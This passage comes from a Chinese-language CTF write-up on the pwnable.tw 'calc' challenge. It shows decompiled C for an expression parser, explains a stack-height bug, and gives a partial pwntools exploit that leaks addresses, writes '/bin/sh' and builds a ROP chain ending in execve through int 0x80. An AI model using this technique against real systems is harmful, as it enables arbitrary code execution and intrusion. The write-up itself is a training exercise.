+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dest_len</span><span class=p>;</span>        <span class=c1>// [esp+18h] [ebp-90h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>src_str_cpy</span><span class=p>;</span>   <span class=c1>// [esp+1Ch] [ecp-8Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>numstr_bgn</span><span class=p>;</span>      <span class=c1>// [esp+20h] [ebp-88h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>               <span class=c1>// [esp+24h] [ebp-84h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>stack_top</span><span class=p>;</span>       <span class=c1>// [esp+28h] [ebp-80h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>numstr_len</span><span class=p>;</span>      <span class=c1>// [esp+2Ch] [ebp-7Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>numstr</span><span class=p>;</span>        <span class=c1>// [esp+30h] [ebp-78h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>number</span><span class=p>;</span>          <span class=c1>// [esp+34h] [ebp-74h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>stack</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>     <span class=c1>// [esp+38h] [ebp-70h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>canary</span><span class=p>;</span> <span class=c1>// [esp+9Ch] [ebp-Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>numstr_bgn</span> <span class=o>=</span> <span class=n>src_str</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>stack_top</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>bzero</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span> <span class=mh>0x64u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// if operator
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=o>*</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>)</span> <span class=o>-</span> <span class=mi>48</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>9</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>numstr_len</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span> <span class=o>-</span> <span class=n>numstr_bgn</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=n>numstr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=n>numstr_len</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>memcpy</span><span class=p>(</span><span class=n>numstr</span><span class=p>,</span> <span class=n>numstr_bgn</span><span class=p>,</span> <span class=n>numstr_len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>numstr</span><span class=p>[</span><span class=n>numstr_len</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>numstr</span><span class=p>,</span> <span class=s>&#34;0&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=n>puts</span><span class=p>(</span><span class=s>&#34;prevent division by zero&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=n>number</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>numstr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>number</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=n>dest_len</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>dest</span><span class=p>)</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>dest</span><span class=p>[</span><span class=n>dest_len</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>number</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=o>*</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>)</span> <span class=o>-</span> <span class=mi>48</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>9</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=n>puts</span><span class=p>(</span><span class=s>&#34;expression error!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=n>numstr_bgn</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>switch</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=sc>&#39;%&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=sc>&#39;*&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=sc>&#39;/&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>// */%: 栈顶是加减法则将操作符入栈，否则调用 eval 后覆盖栈顶
+</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=k>if</span> <span class=p>(</span><span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;+&#39;</span> <span class=o>&amp;&amp;</span> <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;-&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=p>{</span>
+</span></span><span class=line><span class=cl>                        <span class=n>eval</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>                        <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>                    <span class=k>else</span>
+</span></span><span class=line><span class=cl>                    <span class=p>{</span>
+</span></span><span class=line><span class=cl>                        <span class=n>stack</span><span class=p>[</span><span class=o>++</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=sc>&#39;+&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=sc>&#39;-&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>// +-: 调用 eval 后覆盖栈顶
+</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=n>eval</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>                    <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=k>default</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>eval</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=o>--</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>i</span> <span class=o>+</span> <span class=n>src_str</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>stack_top</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>eval</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>stack</span><span class=p>[</span><span class=n>stack_top</span><span class=o>--</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这个解析运算符的流程大致可以从 <code>数字栈 num_stack</code> 与 <code>操作符栈 op_stack</code> 这两个栈之间的运算展开。我觉得有必要用一个状态转换图来解释这个函数的工作流程，我们用操作符栈的栈顶来确定三种状态：</p><img src=./calc-parse_expr-sm.png width=50%><ol><li>上图中：方形表示状态，矩形表示执行的操作，箭头上的字符表示状态转移条件；</li><li>上图中：<code>State1</code> 表示操作符栈顶为空，<code>State2</code> 表示操作符栈顶不是 <code>+-</code> 号，<code>State3</code> 表示操作符栈顶是加减号。很显然，初始状态是 <code>State1</code>；</li><li>程序的逻辑保证了：任何一个操作符后一个字符不会是操作符，除号的第二个操作符不能是 <code>"0"</code></li></ol><h2 id=漏洞>漏洞</h2><h3 id=发现>发现</h3><p>经过上面的分析，<code>parse_expr</code> 这个函数我主要发现了两个漏洞：</p><ol><li>程序在排除被除数不为 0 的条件时，用的判断是被除数字符串不等于 <code>"0"</code>；对于这个漏洞，我们可以通过输入 <code>"00"</code> 等方式让程序产生除零操作。但是并不知道这个漏洞如何利用；</li><li>程序在执行 <code>eval</code> 时，必须要满足数字栈中存在大于两个的数字，但是以下原因会导致这个条件并不成立：<ol><li>输入字符串的第一个字符为操作符；</li><li>某次的输入数字为 0，这个数字则不会被程序压栈；</li></ol></li></ol><p>下面我们尝试利用第二条的第一个漏洞，就可以改变数字栈的高度，从而达到修改任意地址的目的。</p><h3 id=利用>利用</h3><p>我们利用的基本思路是：先泄露栈地址，然后注入字符串 <code>/bin/sh</code>，最后构造一个这样的栈：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>stack-top	|ad1	|0xb	|ad2	|0x0	|adstr	|ad3	|0x0	|ad4
+</span></span></code></pre></td></tr></table></div></div><p>其中 <code>ad1</code>、<code>ad2</code>、<code>ad3</code>、<code>ad4</code> 是三个通过 <code>ROP</code> 技术的到的三个地址，它们分别执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ad1:	pop %eax; ret;
+</span></span><span class=line><span class=cl>ad2:	pop %ecx; pop %ebx; ret;
+</span></span><span class=line><span class=cl>ad3:	pop %edx; ret;
+</span></span><span class=line><span class=cl>ad4:	int 80h;
+</span></span></code></pre></td></tr></table></div></div><p>而其中的 <code>adstr</code> 则是之前注入的 <code>/bin/sh</code> 的地址。构造了如下的 <code>exp</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=c1>#coding=utf-8</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Challenge</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>local</span><span class=o>=</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>local</span> <span class=o>=</span> <span class=n>local</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>local</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s1>&#39;./calc&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;chall.pwnable.tw&#34;</span><span class=p>,</span> <span class=mi>10100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>gdb</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=bp>self</span><span class=o>.</span><span class=n>local</span>
+</span></span><span class=line><span class=cl>        <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>pidof</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=n>gdbscript</span><span class=o>=</span><span class=s2>&#34;b *get_expr&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>leak_ebp</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>        payload: *361
+</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>offset</span> <span class=o>=</span> <span class=mh>0x5a0</span> <span class=o>/</span> <span class=mi>4</span> <span class=o>+</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;*</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>main_ebp</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>10</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>calc_ebp</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>main_ebp</span> <span class=o>-</span> <span class=mh>0x20</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>parse_expr_ebp</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>calc_ebp</span> <span class=o>-</span> <span class=mh>0x5c0</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;main $ebp:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>main_ebp</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;calc $ebp:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>calc_ebp</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;parse_ebp $ebp:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>parse_expr_ebp</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write_binsh</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>        payload: *701+1845554944+6845231
+</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>binsh</span> <span class=o>=</span> <span class=p>[</span><span class=n>u32</span><span class=p>(</span><span class=s2>&#34;/bin&#34;</span><span class=p>),</span> <span class=n>u32</span><span class=p>(</span><span class=s2>&#34;/sh</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>)]</span> <span class=c1># 0x6e69622f, 0x0068732f</span>
+</span></span><span class=line><span class=cl>        <span class=n>sent_number</span> <span class=o>=</span> <span class=p>[</span><span class=n>binsh</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>binsh</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>binsh</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;*701+</span><span class=si>%d</span><span class=s2>+</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>sent_number</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>sent_number</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>p32</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=s2>&#34;/bin&#34;</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>binsh_addr</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>calc_ebp</span> <span class=o>-</span> <span class=mh>0x5a0</span> <span class=o>+</span> <span class=mi>700</span> <span class=o>*</span> <span class=mi>4</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;write &#39;/bin/sh&#39;: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>hex</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>binsh_addr</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>ROP</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr1</span> <span class=o>=</span> <span class=mh>0x0805c34b</span>      <span class=c1># pop eax; ret</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr2</span> <span class=o>=</span> <span class=mh>0x080701d1</span>      <span class=c1># pop ecx; pop ebx; ret</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr3</span> <span class=o>=</span> <span class=mh>0x080701aa</span>      <span class=c1># pop edx; ret</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr4</span> <span class=o>=</span> <span class=mh>0x08049a21</span>      <span class=c1># int 0x80</span>
+</span></span><span class=line><span class=cl>        <span class=n>stack</span> <span class=o>=</span> <span class=p>[</span><span class=n>addr1</span><span class=p>,</span> <span class=mh>0xb</span><span class=p>,</span> <span class=n>addr2</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=o>-</span><span class=mh>0x100000000</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>binsh_addr</span><span class=p>,</span> <span class=n>addr3</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>addr4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>=</span> <span class=p>[</span> <span class=n>stack</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>stack</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>)]</span> <span class=o>+</span> <span class=p>[</span> <span class=n>stack</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>n</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;*361-1*</span><span class=si>%d</span><span class=s2>-1*</span><span class=si>%d</span><span class=s2>-1*</span><span class=si>%d</span><span class=s2>-1*</span><span class=si>%d</span><span class=s2>+</span><span class=si>%d</span><span class=s2>+</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> \
+</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=n>n</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>n</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>n</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=o>-</span><span class=n>n</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=mh>0x80000000</span><span class=o>+</span><span class=n>n</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=mh>0x80000000</span><span class=o>+</span><span class=n>n</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;-1*</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>n</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
